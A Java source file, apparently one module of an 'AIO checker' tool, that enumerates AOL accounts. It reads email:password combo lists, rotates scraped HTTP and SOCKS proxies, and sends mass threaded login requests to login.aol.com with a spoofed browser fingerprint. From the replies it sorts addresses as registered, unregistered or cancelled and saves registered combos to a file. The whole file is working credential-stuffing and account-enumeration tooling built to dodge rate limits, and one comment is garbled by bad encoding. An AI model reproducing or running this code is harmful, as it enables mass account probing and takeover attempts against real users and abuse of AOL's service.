package SerendipityAIOChecker.checker.Aol;

import SerendipityAIOChecker.checker.Auth.UserAuth;
import SerendipityAIOChecker.checker.CUI.CUI;
import SerendipityAIOChecker.checker.GUI.CheckerGUI;
import SerendipityAIOChecker.checker.GUI.Message;
import SerendipityAIOChecker.checker.Microsoft.Microsoft;
import SerendipityAIOChecker.checker.Proxy.ProxyTester;
import org.jsoup.Connection;
import org.jsoup.Jsoup;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import static java.lang.Thread.sleep;

public class AolEmail {
    public static final Lock lock = new ReentrantLock();
    public static final String Module = "Aol";
    public static int aol_VmThreads;
    public static List<String> proxies = new ArrayList<>();
    public static int aol_VmUnregistered;
    public static int aol_VmRegistered;
    public static int aol_VmCancelled;
    public static int aol_CPM;
    public static int aol_Process;
    public static int aol_CombosNumber;
    public static boolean aol_EnableUseProxiesAPIs = false;
    public static boolean aol_ShowInvalid;
    public static int minProxiesPool = 1;
    public static int minGoodProxiesPool = 1;
    public static int apiProxiesRetryTimes = 1;
    public static boolean showProxiesUpdateMessages = false;

    public static boolean aolCheckerDoneWork = false;
    public static List<String> aol_GoodProxies = new ArrayList<>();
    public static  int connectTimeouts = 6000;
    public static  int aol_ProxyErrors = 0;
    public static String time;
    public static ArrayBlockingQueue<String> queue;

    public static void updateTitle() {
        String title = CUI.title + "->Aol VM Checker|Registered:" + aol_VmRegistered +
                "| |UnRegistered:" + aol_VmUnregistered + "| |Cancelled:" + aol_VmCancelled + "| |Process:" + aol_Process + "/" + aol_CombosNumber +
                "| |GoodProxies/Proxies:" + aol_GoodProxies.size() + "/" + ProxyTester.proxies.size()
                + "| |CPM:" + aol_CPM+ "| |ProxiesErrors:" + aol_ProxyErrors;
        System.out.print("\033]0;" + title + "\007");
        System.out.flush();
    }

    public static Set<String> readCombos() {
        Set<String> lines = new HashSet<>();
        try (BufferedReader br = new BufferedReader(new FileReader("./files/Combos.txt"))) {
            String line;
            while ((line = br.readLine()) != null) {
                String[] parts = line.split(":");
                if (parts.length == 2) {
                    lines.add(line);
                }
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return lines;
    }

    public static void checkerInfo() {
        try {
            if (!CUI.enableGUI) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            }
            System.out.println(CUI.ANSI_PURPLE + "[INFO]");
            System.out.println(CUI.ANSI_RED + CUI.title);
            System.out.println(CUI.ANSI_RESET + "Module:" + CUI.ANSI_RED + Module);
            System.out.println(CUI.ANSI_RESET + "Threads:" + CUI.ANSI_RED + aol_VmThreads);

            System.out.println(CUI.ANSI_RESET + "Combos:" + CUI.ANSI_RED + aol_CombosNumber + CUI.ANSI_RESET + " | " + CUI.ANSI_RESET +
                    "Proxies:" + CUI.ANSI_RED + ProxyTester.proxies.size());

        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    public static void readConfig() {
        try (BufferedReader br = new BufferedReader(new FileReader("./configs/AolConfig.ini"))){
            String line;
            while ((line = br.readLine()) != null){
                String[] parts = line.split("\\|");
                if (parts.length == 2){
                    String s = parts[1];
                    switch (parts[0]){
                        case "VM Threads" -> aol_VmThreads = Integer.parseInt(s);
                        case "Enable API To Get Proxies(Y/N)" -> {
                            if (s.equals("Y")){
                                aol_EnableUseProxiesAPIs = true;
                            }else if (!s.equals("N")){
                                aol_EnableUseProxiesAPIs = false;
                            }
                        }
                        case "Number Of Proxy Retries Using The API Obtained At Once" -> apiProxiesRetryTimes = Integer.parseInt(s);
                        case "Connect Timeout" -> connectTimeouts = Integer.parseInt(s);
                        case "Min Proxies Pool" -> minProxiesPool = Integer.parseInt(s);
                        case "Min Good Proxies Pool" -> minGoodProxiesPool = Integer.parseInt(s);
                        case "Show Proxies Update Messages(Y/N)" -> {
                            if (s.equals("Y")){
                                showProxiesUpdateMessages = true;
                            }else if (!s.equals("N")){
                                showProxiesUpdateMessages = false;
                            }
                        }
                        case "Show Invalid/Unregistered(Y/N)" -> {
                            if (s.equals("Y")){
                                aol_ShowInvalid = true;
                            }else if (!s.equals("N")){
                                aol_ShowInvalid = false;
                            }
                        }
                    }
                }

            }


        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    public static void startChecking() throws InterruptedException {
        if (UserAuth.userLevel.equals("Microsoft")){
            System.out.println("Your Level Cant Use The Function~ !!");
            return;
        }
        readConfig();
        Message.show("Aol VM Checker");
        Set<String> combos = readCombos();
        aol_CombosNumber = combos.size();
        getCPM();
        time = Microsoft.time();
        try {
            if (aol_EnableUseProxiesAPIs){
                Set<String> apis = ProxyTester.readHttpProxyAPIs();
                for (String api:apis){
                    List<String> proxies = ProxyTester.parseProxiesFromSourceCode(ProxyTester.getWebPageSourceCode(api));
                    ProxyTester.configureProxies(proxies, Proxy.Type.HTTP);
                }
                apis = ProxyTester.readSocksProxyAPIs();
                for (String api:apis){
                    List<String> proxies = ProxyTester.parseProxiesFromSourceCode(ProxyTester.getWebPageSourceCode(api));
                    ProxyTester.configureProxies(proxies, Proxy.Type.SOCKS);
                }
            }
            proxies.addAll(ProxyTester.proxies);
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
        checkerInfo();
        ExecutorService executorService = Executors.newFixedThreadPool(aol_VmThreads);
        String s = getCookiesAndAcrumb();
        String cookies = s.split("<><>")[0];
        String acrumb = s.split("<><>")[1];
        Microsoft.createFolder(time + "/AolModule");
        queue= new ArrayBlockingQueue<>(aol_CombosNumber);
        queue.addAll(combos);
        combos.clear();
        aol_CombosNumber = queue.size();
        while (aol_Process < aol_CombosNumber) {
            String combo = queue.take();
            executorService.execute(() -> {
                boolean ss = aolVmChecker(combo, acrumb, cookies);
                if (!ss) {
                    try {
                        queue.put(combo);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                }
            });
        }
            executorService.shutdown();
            executorService.awaitTermination(Long.MAX_VALUE, TimeUnit.MILLISECONDS);
        System.out.println(CUI.ANSI_RED + "Done Works!");

    }
    public static  String getCookiesAndAcrumb(){
        try {
            Connection connection = Jsoup.connect("https://login.aol.com/");
            Connection.Response response = connection.execute();
            return response.cookies().toString().replace("{", "").replace("}", "").replace(",", ";") + "<><>" + ProxyTester.extractStringBetween(response.cookies().get("AS"),"s=","&");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }
    public static boolean aolVmChecker(String combo,String acrumb,String cookies){
        if (!CUI.enableGUI){
            updateTitle();
        }else {
            CheckerGUI.updateAolVMCheckerInfo();
        }
        String proxy;
        if (aol_GoodProxies.size() >= minGoodProxiesPool){
            proxy = ProxyTester.AolModule_GetGoodProxy(aol_GoodProxies);
        }else {
            proxy = ProxyTester.AolModule_GetRandomProxy(ProxyTester.proxies);
        }
        String[] proxy1;
        if (proxy != null) {
            proxy1 = proxy.trim().split(":");
        } else {
            ProxyTester.proxies.remove(null);
            return false;
        }
        ProxyTester.updatedProxies = true;
        Proxy proxy3;
        if (proxy1.length == 3) {
            proxy3 = new Proxy(Proxy.Type.valueOf(proxy1[2]), new InetSocketAddress(proxy1[0], Integer.parseInt(proxy1[1])));

        } else {
            ProxyTester.proxies.remove(proxy);
            return false;
        }
        String email = combo.split(":")[0];
        try {
            Connection connection = Jsoup.connect("https://login.aol.com/?specId=yidregsimplified&done=https://www.aol.com/&intl=us&prompt=login")
                    .header("Cookie", cookies)
                    .timeout(connectTimeouts)
                    .method(Connection.Method.POST)
                    .ignoreContentType(true)
                    .proxy(proxy3)
                    .header("content-type","application/x-www-form-urlencoded; charset=UTF-8")
                    .requestBody("browser-fp-data=%7B%22language%22%3A%22en%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A%22unknown%22%2C%22pixelRatio%22%3A1.25%2C%22hardwareConcurrency%22%3A16%2C%22timezoneOffset%22%3A-480%2C%22timezone%22%3A%22Asia%2FShanghai%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unspecified%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%20Direct3D11%20vs_5_0%20ps_5_0)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A50%2C%22hash%22%3A%22afe1ffb1d849424cf961b580581f096e%22%7D%2C%22audio%22%3A%2235.7383295930922%22%2C%22resolution%22%3A%7B%22w%22%3A%221536%22%2C%22h%22%3A%22864%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22816%22%2C%22h%22%3A%221536%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1693133213018%2C%22render%22%3A1693133212289%7D%7D&crumb=HdyDHyJ8Eq4&acrumb="+acrumb+"&sessionIndex=QQ--&displayName=&username="+email+"&passwd=&signin=Next")
                    .header("X-Requested-With","XMLHttpRequest");
            Connection.Response response = connection.execute();
            if (response.body().contains("recaptcha")){

                aol_VmRegistered++;
                aol_Process++;
                if (!aol_GoodProxies.contains(proxy)){
                    aol_GoodProxies.add(proxy);
                }
                System.out.println(CUI.ANSI_RESET + "[Registered]" + CUI.ANSI_GREEN + "[*]"
                        + CUI.ANSI_CYAN + " |" + email + "|"
                        + CUI.ANSI_YELLOW + " |" + proxy + "|");
                writeResult("./output/" + time + "/AolModule/Registered.txt",combo);
                return true;
            }else if (response.body().contains("/account/challenge/fail")){
                aol_VmCancelled++;
                aol_Process++;
                aol_GoodProxies.add(proxy);
                if (aol_ShowInvalid){
                    System.out.println(CUI.ANSI_RESET + "[Cancelled]" + CUI.ANSI_BRIGHT_CYAN + "[?]"
                            + CUI.ANSI_CYAN + " |" + email + "|"
                            + CUI.ANSI_YELLOW + " |" + proxy + "|");
                }
                return true;
            }else if (response.body().contains("INVALID_USERNAME")){
                aol_VmUnregistered++;
                aol_Process++;
                aol_GoodProxies.add(proxy);
                if (aol_ShowInvalid){
                    System.out.println(CUI.ANSI_RESET + "[Unregistered]" + CUI.ANSI_BRIGHT_CYAN + "[?]"
                            + CUI.ANSI_CYAN + " |" + email + "|"
                            + CUI.ANSI_YELLOW + " |" + proxy + "|");
                }
                return true;
            }else {
                System.out.println(response.body());
                System.out.println(combo);
                aol_Process++;
                return true;
            }
        } catch (IOException | UncheckedIOException e) {
            aol_ProxyErrors++;
            if (!ProxyTester.proxies.isEmpty()) {
                ProxyTester.proxies.remove(proxy);
            }
            if (!aol_GoodProxies.isEmpty()) {
                aol_GoodProxies.remove(proxy);
            }
        } catch (NoSuchElementException | org.jsoup.UncheckedIOException ignored) {
        }
        return false;
    }
    private static void getCPM() {
        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
        // ����һ��Runnable���񣬱�ʾ��Ҫִ�еĲ���
        Runnable task = () -> {
            try {
                int fristProcess = aol_Process;
                sleep(1000);
                aol_CPM = (aol_Process - fristProcess) * 60;
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }

        };

        scheduler.scheduleAtFixedRate(task, 0, 1, TimeUnit.SECONDS);
        while (aolCheckerDoneWork) {
            scheduler.shutdown();
        }
    }
    private static void writeResult(String path,String combos){
        BufferedWriter bw = null;
        try {
            lock.lock();
            bw = new BufferedWriter(new FileWriter(path,true));
            bw.write(combos);
            bw.newLine();
            bw.flush();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }finally {
            if (bw != null) {
                try {
                    bw.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            lock.unlock();
        }
    }


}
